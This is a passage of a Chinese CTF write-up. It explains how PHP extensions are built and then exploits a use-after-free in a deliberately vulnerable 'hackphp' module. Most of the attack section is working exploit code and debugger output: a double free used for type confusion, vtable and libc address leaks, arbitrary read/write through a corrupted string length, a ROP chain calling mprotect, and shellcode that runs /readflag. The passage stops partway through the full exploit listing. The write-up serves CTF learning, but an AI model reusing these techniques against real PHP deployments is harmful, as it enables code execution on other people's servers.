*/PHP_FUNCTION(helloword_test1)&#123;\tZEND_PARSE_PARAMETERS_NONE();\tphp_printf(&quot;The extension %s is loaded and working!\\r\\n&quot;, &quot;helloword&quot;);&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; string helloword_test2( [ string $var ] ) */PHP_FUNCTION(helloword_test2)&#123;\tchar *var = &quot;World&quot;;\tsize_t var_len = sizeof(&quot;World&quot;) - 1;\tzend_string *retval;\tZEND_PARSE_PARAMETERS_START(0, 1)\t\tZ_PARAM_OPTIONAL\t\tZ_PARAM_STRING(var, var_len)\tZEND_PARSE_PARAMETERS_END();\tretval = strpprintf(0, &quot;Hello %s&quot;, var);\tRETURN_STR(retval);&#125;/* &#125;&#125;&#125;*//* &#123;&#123;&#123; PHP_RINIT_FUNCTION */PHP_RINIT_FUNCTION(helloword)&#123;#if defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)\tZEND_TSRMLS_CACHE_UPDATE();#endif\treturn SUCCESS;&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; PHP_MINFO_FUNCTION */PHP_MINFO_FUNCTION(helloword)&#123;\tphp_info_print_table_start();\tphp_info_print_table_header(2, &quot;helloword support&quot;, &quot;enabled&quot;);\tphp_info_print_table_end();&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; arginfo */ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)ZEND_END_ARG_INFO()ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\tZEND_ARG_INFO(0, str)ZEND_END_ARG_INFO()/* &#125;&#125;&#125; *//* &#123;&#123;&#123; helloword_functions[] */static const zend_function_entry helloword_functions[] = &#123;\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\tPHP_FE_END&#125;;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; helloword_module_entry */zend_module_entry helloword_module_entry = &#123;\tSTANDARD_MODULE_HEADER,\t&quot;helloword&quot;,\t\t\t\t\t/* Extension name */\thelloword_functions,\t\t\t/* zend_function_entry */\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\tPHP_HELLOWORD_VERSION,\t\t/* Version */\tSTANDARD_MODULE_PROPERTIES&#125;;/* &#125;&#125;&#125; */#ifdef COMPILE_DL_HELLOWORD# ifdef ZTSZEND_TSRMLS_CACHE_DEFINE()# endifZEND_GET_MODULE(helloword)#endif\n其中由PHP_FUNCTION宏修饰的函数代表该函数可以直接在php中进行调用，由PHP_RINIT_FUNCTION修饰的函数将在一个新请求到来时被调用，其描述如下\n\n当一个页面请求到来时候，PHP 会迅速开辟一个新的环境，并重新扫描自己的各个扩展，遍历执行它们各自的RINIT 方法(俗称 Request Initialization)，这时候一个扩展可能会初始化在本次请求中会使用到的变量等， 还会初始化用户端（即 PHP 脚本）中的变量之类的，内核预置了 PHP_RINIT_FUNCTION() 这个宏函数来帮我们实现这个功能\n\n由PHP_MINIT_FUNCTION 修饰的函数将在初始化module时运行。最终将需要在php中调用的函数指针写到一个统一的数组中。\nstatic const zend_function_entry helloword_functions[] = &#123;        PHP_FE(helloword_test1,         arginfo_helloword_test1)        PHP_FE(helloword_test2,         arginfo_helloword_test2)        PHP_FE_END&#125;;\n然后由zend_module_entry helloword_module_entry进行注册，该结构体记录了整个模块需要提供的一些信息。\nzend_module_entry helloword_module_entry = &#123;        STANDARD_MODULE_HEADER,        &quot;helloword&quot;,                                    /* Extension name */        helloword_functions,                    /* zend_function_entry */        NULL,                                                   /* PHP_MINIT - Module initialization */        NULL,                                                   /* PHP_MSHUTDOWN - Module shutdown */        PHP_RINIT(helloword),                   /* PHP_RINIT - Request initialization */        NULL,                                                   /* PHP_RSHUTDOWN - Request shutdown */        PHP_MINFO(helloword),                   /* PHP_MINFO - Module info */        PHP_HELLOWORD_VERSION,          /* Version */        STANDARD_MODULE_PROPERTIES&#125;;\n传参在函数里，由ZEND_PARSE_PARAMETERS_NONE()修饰的代表无参数；而ZEND_PARSE_PARAMETERS_START规定了参数的个数，其定义如下\n#define ZEND_PARSE_PARAMETERS_START(min_num_args, max_num_args) ZEND_PARSE_PARAMETERS_START_EX(0, min_num_args, max_num_args)\n而Z_PARAM_OPTIONAL代表参数可有可无，不是必须；Z_PARAM_STRING(var, var_len)代表该参数是字符串对象，并且将其内容地址和长度分别赋值给var和var_len。还有很多类型，如下表：\nspecifier\tFast ZPP API macro\targs|\tZ_PARAM_OPTIONALa\tZ_PARAM_ARRAY(dest)\tdest - zval*A\tZ_PARAM_ARRAY_OR_OBJECT(dest)\tdest - zval*b\tZ_PARAM_BOOL(dest)\tdest - zend_boolC\tZ_PARAM_CLASS(dest)\tdest - zend_class_entry*d\tZ_PARAM_DOUBLE(dest)\tdest - doublef\tZ_PARAM_FUNC(fci, fcc)\tfci - zend_fcall_info, fcc - zend_fcall_info_cacheh\tZ_PARAM_ARRAY_HT(dest)\tdest - HashTable*H\tZ_PARAM_ARRAY_OR_OBJECT_HT(dest)\tdest - HashTable*l\tZ_PARAM_LONG(dest)\tdest - longL\tZ_PARAM_STRICT_LONG(dest)\tdest - longo\tZ_PARAM_OBJECT(dest)\tdest - zval*O\tZ_PARAM_OBJECT_OF_CLASS(dest, ce)\tdest - zval*p\tZ_PARAM_PATH(dest, dest_len)\tdest - char*, dest_len - intP\tZ_PARAM_PATH_STR(dest)\tdest - zend_string*r\tZ_PARAM_RESOURCE(dest)\tdest - zval*s\tZ_PARAM_STRING(dest, dest_len)\tdest - char*, dest_len - intS\tZ_PARAM_STR(dest)\tdest - zend_string*z\tZ_PARAM_ZVAL(dest)\tdest - zval* \tZ_PARAM_ZVAL_DEREF(dest)\tdest - zval*+\tZ_PARAM_VARIADIC(&#x27;+&#x27;, dest, num)\tdest - zval*, num int*\tZ_PARAM_VARIADIC(&#x27;*&#x27;, dest, num)\tdest - zval*, num int\n测试编译以后得到了模块\nroot@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# lshelloword.la  helloword.so\n安装该模块\ncp helloword.so /usr/local/lib/php/extensions/no-debug-non-zts-20190902\nphp.ini里添加\nextension=helloword.so\n测试程序如下\n&lt;?phphelloword_test1();helloword_test2(&quot;aaa&quot;);?&gt;\n运行结果\nroot@ubuntu:/home/sea/Desktop/php-src/ext/helloword/modules# php 1.phpThe extension helloword is loaded and working!\n可以看到模块成功被调用，并且在php中的调用十分方便，当成普通函数调用就可以了。\n0x02 PHP模块逆向分析将helloword.so模块用IDA打开分析定位到函数表，可以发现供我们在php里调用的函数有两个，且这些函数名都以zif开头进入zif_helloword_test2函数，可以看到，宏都被展开了，前面是对参数个数的判断，后面则是对变量进行赋值。至此，对php模块，我们已经有了大致的了解。\n0x03 hackphp漏洞分析首先用IDA分析，找到zif开头的函数因此，在php中我们能调用该模块中的4个函数，分别为\nhackphp_createhackphp_deletehackphp_edithackphp_get\nhackphp_create函数接收一个整型参数，其功能是可以调用_emalloc创建一个堆，这里存在一个UAF漏洞，就是当0&lt;=size&lt;256或者size&gt;512时不会直接return，会执行到efree将申请的堆给释放掉，然后其指针仍然保留给了buf全局变量。\nhackphp_delete函数无参数，其功能是将buf指向的堆efree掉，并清空buf指针\nhackphp_edit函数接收一个字符串参数，并将其内容写入到buf里，这里注意的是，php里传入的字符串，即使其字符串中存在\\x00，其length也不是以该字符截断的，该字符串对象的length成员表示其内容的字节数，并且在hackphp_edit函数中，使用了memcpy而不是strncpy这意味着hackphp_edit不会因为字符串中存在\\0而截断，因此，我们可以用该函数进行字节编辑。\nhackphp_get函数用于显示buf的内容，由于使用的是zend_strpprintf(0LL,&quot;%s&quot;, buf)因此会受到\\0字符的截断。\n漏洞分析完了，该模块存在一个UAF，但是由于使用的是emalloc/efree不能像glibc的ptmalloc那样进行花式利用，我们可以利用double free，因为通过测试，double free不会报错，并且重新申请两次时都可以申请到此处，因此我们可以考虑让两个php对象同时占位于此，达到类型混淆的目的。\n漏洞利用分析我们可以将DateInterval对象占位于此。为了确定该对象的结构大小，我们使用如下代码测试，其中$str = fread(STDIN,1000);起到阻塞的效果。\n&lt;?php$str = fread(STDIN,1000);$dv = new DateInterval(&#x27;P1Y&#x27;);$str = fread(STDIN,1000);?&gt;\n运行该程序php 1.php,然后另外开一个窗口，用gdb进行attach调试。给emalloc函数下断点\npwndbg&gt; b _emallocBreakpoint 1 at 0x55ea1e726970: file /home/sea/Desktop/php-src/Zend/zend_alloc.c, line 2533.\n然后继续运行,程序断下后，发现此时size为56继续运行，发现不止一次下断，我们记录下每一次下断后emalloc返回的地址，最终发现第一次emalloc(56)的堆里有许多有用的数据。\n RAX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ...*RBX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ... RCX  0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ... RDX  0x7f5e33200070 —▸ 0x7f5e332010c0 —▸ 0x7f5e332010d8 —▸ 0x7f5e332010f0 —▸ 0x7f5e33201108 ◂— ... RDI  0x7f5e33200040 ◂— 0x0*RSI  0x5654177dbf50 ◂— 0x1 R8   0x7f5e33254440 ◂— 0x600000001 R9   0x7f5e33200000 —▸ 0x7f5e33200040 ◂— 0x0 R10  0x7f000 R11  0x246*R12  0x7f5e332551d0 ◂— 0x0 R13  0x0 R14  0x7f5e33212020 —▸ 0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64  R15  0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64  RBP  0x5654177dbf50 ◂— 0x1*RSP  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\\n; htt&#x27;)*RIP  0x5654152b6512 (date_object_new_interval+66) ◂— movups xmmword ptr [rax], xmm0──────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────   0x5654152b64fc &lt;date_object_new_interval+44&gt;    pxor   xmm0, xmm0   0x5654152b6500 &lt;date_object_new_interval+48&gt;    mov    rsi, rbp   0x5654152b6503 &lt;date_object_new_interval+51&gt;    mov    qword ptr [rax + 0x30], 0   0x5654152b650b &lt;date_object_new_interval+59&gt;    lea    r12, [rax + 0x10]   0x5654152b650f &lt;date_object_new_interval+63&gt;    mov    rbx, rax ► 0x5654152b6512 &lt;date_object_new_interval+66&gt;    movups xmmword ptr [rax], xmm0   0x5654152b6515 &lt;date_object_new_interval+69&gt;    mov    rdi, r12   0x5654152b6518 &lt;date_object_new_interval+72&gt;    movups xmmword ptr [rax + 0x10], xmm0   0x5654152b651c &lt;date_object_new_interval+76&gt;    movups xmmword ptr [rax + 0x20], xmm0   0x5654152b6520 &lt;date_object_new_interval+80&gt;    call   zend_object_std_init &lt;zend_object_std_init&gt;    0x5654152b6525 &lt;date_object_new_interval+85&gt;    mov    rsi, rbp───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────────────In file: /home/sea/Desktop/php-src/Zend/zend_objects_API.h   89  * Properties MUST be initialized using object_properties_init(). */   90 static zend_always_inline void *zend_object_alloc(size_t obj_size, zend_class_entry *ce) &#123;   91 \tvoid *obj = emalloc(obj_size + zend_object_properties_size(ce));   92 \t/* Subtraction of sizeof(zval) is necessary, because zend_object_properties_size() may be   93 \t * -sizeof(zval), if the object has no properties. */ ► 94 \tmemset(obj, 0, obj_size - sizeof(zval));   95 \treturn obj;   96 &#125;   97    98 static inline zend_property_info *zend_get_property_info_for_slot(zend_object *obj, zval *slot)   99 &#123;───────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────00:0000│ rsp  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\\n; htt&#x27;)01:0008│      0x7ffe15719fd8 —▸ 0x5654177dbf50 ◂— 0x102:0010│      0x7ffe15719fe0 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e (&#x27;nt Log o&#x27;)03:0018│      0x7ffe15719fe8 —▸ 0x56541550c9a9 (object_init_ex+57) ◂— mov    dword ptr [rbx + 8], 0x30804:0020│      0x7ffe15719ff0 ◂— 0x005:0028│      0x7ffe15719ff8 —▸ 0x7f5e33212190 ◂— 0x206f74203b0a6465 (&#x27;ed\\n; to &#x27;)06:0030│      0x7ffe1571a000 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\\n; htt&#x27;)07:0038│      0x7ffe1571a008 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e (&#x27;nt Log o&#x27;)─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────── ► f 0     5654152b6512 date_object_new_interval+66   f 1     5654152b6512 date_object_new_interval+66   f 2     56541550c9a9 object_init_ex+57   f 3     56541550c9a9 object_init_ex+57   f 4     56541556f585 ZEND_NEW_SPEC_CONST_UNUSED_HANDLER+53   f 5     56541558ba05 execute_ex+8741   f 6     5654155932bd zend_execute+301   f 7     56541550ac3c zend_execute_scripts+204───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\n如上，0x7f5e332551c0为emalloc(56)申请的堆，我们记下该地址，然后输入c继续运行，直到程序不再下断，也就是执行到php代码里的最后一句$str = fread(STDIN,1000);时，此时DateInterval对象创建完成，我们查看该地址处的内容。\npwndbg&gt; tel 0x7f5e332551c000:0000│   0x7f5e332551c0 —▸ 0x7f5e3327e000 ◂— 0x101:0008│   0x7f5e332551c8 ◂— 0x102:0010│   0x7f5e332551d0 ◂— 0xc00004180000000103:0018│   0x7f5e332551d8 ◂— 0x104:0020│   0x7f5e332551e0 —▸ 0x5654177dbf50 ◂— 0x105:0028│   0x7f5e332551e8 —▸ 0x56541607a0a0 (date_object_handlers_interval) ◂— 0x1006:0030│   0x7f5e332551f0 ◂— 0x007:0038│   0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ...pwndbg&gt; tel 0x56541607a0a000:0000│   0x56541607a0a0 (date_object_handlers_interval) ◂— 0x1001:0008│   0x56541607a0a8 (date_object_handlers_interval+8) —▸ 0x5654152b5790 (date_object_free_storage_interval) ◂— endbr64 02:0010│   0x56541607a0b0 (date_object_handlers_interval+16) —▸ 0x56541553be40 (zend_objects_destroy_object) ◂— endbr64 03:0018│   0x56541607a0b8 (date_object_handlers_interval+24) —▸ 0x5654152b6550 (date_object_clone_interval) ◂— endbr64 04:0020│   0x56541607a0c0 (date_object_handlers_interval+32) —▸ 0x5654152b5aa0 (date_interval_read_property) ◂— endbr64 05:0028│   0x56541607a0c8 (date_object_handlers_interval+40) —▸ 0x5654152b5e50 (date_interval_write_property) ◂— endbr64 06:0030│   0x56541607a0d0 (date_object_handlers_interval+48) —▸ 0x56541553cba0 (zend_std_read_dimension) ◂— endbr64 07:0038│   0x56541607a0d8 (date_object_handlers_interval+56) —▸ 0x56541553ce70 (zend_std_write_dimension) ◂— endbr64 pwndbg&gt; \n可以发现该对象内部存在一个虚表，虚表里有许多函数指针，因此，我们可以利用某些方法将这些数据读取出来，进而实现了地址泄露。假设我们将该对象占位于hackphp模块中的UAF堆里，用hackphp_get实现不了泄露，因为该函数遇到\\0会截断。因此我们可以考虑在之前先构造一个double free然后将DateInterval对象占位于此以后，将另外一个对象也占位于此，并且另外一个对象应该能够使用运算符[]，这样我们可以使用运算符[]来读取数据。一个可以考虑的对象是通过str_repeat(&quot;a&quot;,n);创建的字符串对象，至于不直接使用array是因为array对象有些复杂，而字符串对象相对来说要简单一些。首先，我们得确定n为多少，才能让其大小为56与DateInterval对象保持一致。首先尝试0x30\n&lt;?php$str = fread(STDIN,1000);$dv = str_repeat(&quot;a&quot;,0x30); $str = fread(STDIN,1000);?&gt;\n仍然使用gdb进行调试，发现实际调用emalloc时，size为0x50因此，如果我们要控制字符串对象的大小为56的话，n应该为0x18，也就是这样\n$str = str_repeat(&quot;a&quot;,0x18);\n\n RAX  0x7fe101a551c0 —▸ 0x7fe101a551f8 —▸ 0x7fe101a55230 —▸ 0x7fe101a55268 —▸ 0x7fe101a552a0 ◂— ...In file: /home/sea/Desktop/php-src/Zend/zend_string.h   141    142 static zend_always_inline zend_string *zend_string_safe_alloc(size_t n, size_t m, size_t l, int persistent)   143 &#123;   144 \tzend_string *ret = (zend_string *)safe_pemalloc(n, m, ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(l)), persistent);   145  ► 146 \tGC_SET_REFCOUNT(ret, 1);   147 \tGC_TYPE_INFO(ret) = IS_STRING | ((persistent ? IS_STR_PERSISTENT : 0) &lt;&lt; GC_FLAGS_SHIFT);   148 \tZSTR_H(ret) = 0;   149 \tZSTR_LEN(ret) = (n * m) + l;   150 \treturn ret;   151 &#125;\n记下其地址0x7fe101a551c0，然后继续运行，直到不再下断。可以发现，字符串对象结构比较简单，0x18偏移处就是数据区长度，如果我们将其篡改，就可以实现越界读写。假设该对象也占位与hackphp模块的UAF堆中，那么我们就能利用该字符串对象对DateInterval对象内部的数据进行读写。\n漏洞利用于是，我们的php脚本这样写\n//double freehackphp_create(56);hackphp_delete();//$x and $dv now has same address$x = str_repeat(&quot;D&quot;,0x18);$dv = new DateInterval(&#x27;P1Y&#x27;);$dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);echo sprintf(&quot;dv_vatble=0x%lx&quot;,$dv_vtable_addr);echo  &quot;\\n&quot;;$dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;echo sprintf(&quot;dv_self_obj_addr=0x%lx&quot;,$dv_self_obj_addr);echo &quot;\\n&quot;;\n通过上面的脚本，我们已经得到vtable的地址以及该对象自身的地址。接下来，我们重新创建一个堆，然后将一个新的字符串对象占位，通过UAF修改字符串的length成员，从而该字符串对象将具有任意地址读写的能力。\nhackphp_create(0x60);$oob = str_repeat(&quot;D&quot;,0x40);hackphp_edit(&quot;\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff/readflag\\x00&quot;);$oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;echo sprintf(&quot;oob_self_obj_addr=0x%lx&quot;,$oob_self_obj_addr);echo &quot;\\n&quot;;$offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);function read64($oob,$addr) &#123;   /*if ($addr &lt; 0) &#123;      $addr = 0x10000000000000000 + $addr;   &#125;*/   return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);&#125;echo sprintf(&quot;offset=0x%lx&quot;,$offset);\n接下来，就可以泄露虚表里的函数指针地址了，计算出php二进制程序的基址，然后泄露GOT表，计算libc地址，获得gadgets及一些函数的地址。\n$date_object_free_storage_interval_addr = read64($oob,$offset+1);echo sprintf(&quot;date_object_free_storage_interval_addr=0x%lx&quot;,$date_object_free_storage_interval_addr);echo &quot;\\n&quot;;$php_base = $date_object_free_storage_interval_addr - 0x23D790;$strlen_got = $php_base + 0xFFEEB8;$offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;$strlen_addr = read64($oob,$offset);$libc_base = $strlen_addr - 0x18b660;$pop_rdi = $libc_base + 0x0000000000026b72;$pop_rsi = $libc_base + 0x0000000000026b70;$pop_rdx = $libc_base + 0x0000000000162866;$stack_ptr = $libc_base + 0x1ec440;$offset = $stack_ptr - ($oob_self_obj_addr + 0x18);$stack_addr = read64($oob,$offset);$mprotect_addr = $libc_base + 0x11BB00;echo sprintf(&quot;strlen_addr=0x%lx \\n&quot;,$strlen_addr);echo sprintf(&quot;libc_base=0x%lx \\n&quot;,$libc_base);echo sprintf(&quot;stack_addr=0x%lx \\n&quot;,$stack_addr);\n接下来就是如何劫持程序流了，由于具有了任意地址读写的能力，那么利用手法就是仁者见仁智者见智了。然而当你调用$oob[x]进行写时，如果x&lt;=0会发现报错\nfound!PHP Warning:  Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155Warning: Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155\n通过分析源码\nstatic zend_never_inline void zend_assign_to_string_offset(zval *str, zval *dim, zval *value, zval *result)&#123;\tzend_string *old_str;\tzend_uchar c;\tsize_t string_len;\tzend_long offset;\tif (UNEXPECTED(Z_TYPE_P(dim) != IS_LONG)) &#123;\t\toffset = zend_check_string_offset(dim/*, BP_VAR_W*/);\t&#125; else &#123;\t\toffset = Z_LVAL_P(dim);\t&#125;\tif (offset &lt; -(zend_long)Z_STRLEN_P(str)) &#123;\t\t/* Error on negative offset */\t\tzend_error(E_WARNING, &quot;Illegal string offset &quot; ZEND_LONG_FMT, offset);\t\tif (result) &#123;\t\t\tZVAL_NULL(result);\t\t&#125;\t\treturn;\t&#125;\n关键一句\nif (offset &lt; -(zend_long)Z_STRLEN_P(str))\n因为这里，我们length修改为了-1，所以Z_STRLEN_P(str)返回的就是-1取反后就是1，也就是offset必须大于等于1，这意味着，我们只能向后进行任意地址写，当然，可以通过再次修改length为正数，绕过这个if检查。但是我没有这么做，因为栈地址位于最后，所以我可以直接向后找到栈地址，然后劫持栈。\n为了确定栈ROP的位置，我使用了栈内存搜索，知道搜索到一个指定的返回地址结束。因为php_execute_script是执行php脚本的具体实现，所以，我们只需劫持该函数的返回地址，那么我们就需要在栈里搜索该地址，如果找到，就说明这个位置就是我们写ROP的地方了。\n$ret_main_target = $php_base + 0x51d402;//搜索ROP的地址while (true) &#123;   $data = read64($oob,$offset);   //echo sprintf(&quot;0x%lx&quot;,$hackphp_so_addr &amp; 0xFFF);   //echo &quot;\\n&quot;;   if (intval($data) == intval($ret_main_target) ) &#123;      echo &quot;found!&quot;;      break;   &#125;   $offset--;&#125;\n然后就是写入ROP了，不知道为何，不能封装为函数，否则会写入失败。\nfor ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rsi &amp; 0xFF);   $pop_rsi = $pop_rsi &gt;&gt; 0x8;&#125;$offset += 0x8;$data = 0x1000;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 0x10;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rdx &amp; 0xFF);   $pop_rdx = $pop_rdx &gt;&gt; 0x8;&#125;$offset += 0x8;$data = 0x7;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 0x10;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rdi &amp; 0xFF);   $pop_rdi = $pop_rdi &gt;&gt; 0x8;&#125;$offset += 8;$stack_addr = $offset + ($oob_self_obj_addr + 0x18);$data = $stack_addr ^ ($stack_addr &amp; 0xfff);for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 8;$data = $mprotect_addr;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 8;$data = $stack_addr+0x18;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$stack_addr += 0x18;$offset += 0x8;$shellcode = &quot;\\x55\\x48\\x89\\xE5\\x48\\x83\\xEC\\x30\\x48\\xB8\\x2F\\x72\\x65\\x61\\x64\\x66\\x6C\\x61\\x48\\x89\\x45\\xF0\\x48\\xC7\\xC0\\x67\\x00\\x00\\x00\\x48\\x89\\x45\\xF8\\x48\\x8D\\x7D\\xF0\\x48\\xC7\\xC6\\x00\\x00\\x00\\x00\\x48\\xC7\\xC2\\x00\\x00\\x00\\x00\\xB8\\x3B\\x00\\x00\\x00\\x0F\\x05&quot;;$len = strlen($shellcode);//写shellcodefor ($j=0;$j&lt;$len;$j++) &#123;   $oob[$offset+$j] = $shellcode[$j];&#125;\n至此，就完成了漏洞利用。\nexp&lt;?phpfunction u64($val) &#123;   $s = bin2hex($val);   $len = strlen($s);   $ans = &quot;0x&quot;;   for ($i=$len-2;$i&gt;=0;$i-=2) &#123;      $ans = $ans . substr($s,$i,2);   &#125;   return intval($ans,16);&#125;function p32($val) &#123;   $s = dechex($val);   $len = strlen($s);   $ans = &quot;&quot;;   for ($i=$len-2;$i&gt;=0;$i-=2) &#123;      $ans = $ans . substr($s,$i,2);   &#125;   return hex2bin($ans);&#125;//double freehackphp_create(56);hackphp_delete();//$x and $dv now has same address$x = str_repeat(&quot;D&quot;,0x18);$dv = new DateInterval(&#x27;P1Y&#x27;);$dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);echo sprintf(&quot;dv_vatble=0x%lx&quot;,$dv_vtable_addr);echo  &quot;\\n&quot;;$dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;echo sprintf(&quot;dv_self_obj_addr=0x%lx&quot;,$dv_self_obj_addr);echo &quot;\\n&quot;;hackphp_create(0x60);$oob = str_repeat(&quot;D&quot;,0x40);hackphp_edit(&quot;\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff/readflag\\x00&quot;);$oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;echo sprintf(&quot;oob_self_obj_addr=0x%lx&quot;,$oob_self_obj_addr);echo &quot;\\n&quot;;$offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);function read64($oob,$addr) &#123;   /*if ($addr &lt; 0) &#123;      $addr = 0x10000000000000000 + $addr;   &#125;*/   return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);&#125;echo sprintf(&quot;offset=0x%lx&quot;,$offset);echo &quot;\\n&quot;;$date_object_free_storage_interval_addr = read64($oob,$offset+1);echo sprintf(&quot;date_object_free_storage_interval_addr=0x%lx&quot;,$date_object_free_storage_interval_addr);echo &quot;\\n&quot;;$php_base = $date_object_free_storage_interval_addr - 0x23D790;$strlen_got = $php_base + 0xFFEEB8;$offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;$strlen_addr = read64($oob,$offset);$libc_base = $strlen_addr - 0x18b660;$pop_rdi = $libc_base + 0x0000000000026b72;$pop_rsi = $libc_base + 0x0000000000026b70;$pop_rdx = $libc_base + 0x0000000000162866;$stack_ptr = $libc_base + 0x1ec440;$offset = $stack_ptr - ($oob_self_obj_addr + 0x18);$stack_addr = read64($oob,$offset);$mprotect_addr = $libc_base + 0x11BB00;echo sprintf(&quot;strlen_addr=0x%lx \\n&quot;,$strlen_addr);echo sprintf(&quot;libc_base=0x%lx \\n&quot;,$libc_base);echo sprintf(&quot;stack_addr=0x%lx \\n&quot;,$stack_addr);$offset = $stack_addr - ($oob_self_obj_addr + 0x18);$ret_main_target = $php_base + 0x51d402;//搜索ROP的地址while (true) &#123;   $data = read64($oob,$offset);   //echo sprintf(&quot;0x%lx&quot;,$hackphp_so_addr &amp; 0xFFF);   //echo &quot;\\n&quot;;   if (intval($data) == intval($ret_main_target) ) &#123;      echo &quot;found!&quot;;      break;   &#125;   $offset--;&#125;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rsi &amp; 0xFF);   $pop_rsi = $pop_rsi &gt;&gt; 0x8;&#125;$offset += 0x8;$data = 0x1000;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 0x10;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rdx &amp; 0xFF);   $pop_rdx = $pop_rdx &gt;&gt; 0x8;&#125;$offset += 0x8;$data = 0x7;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 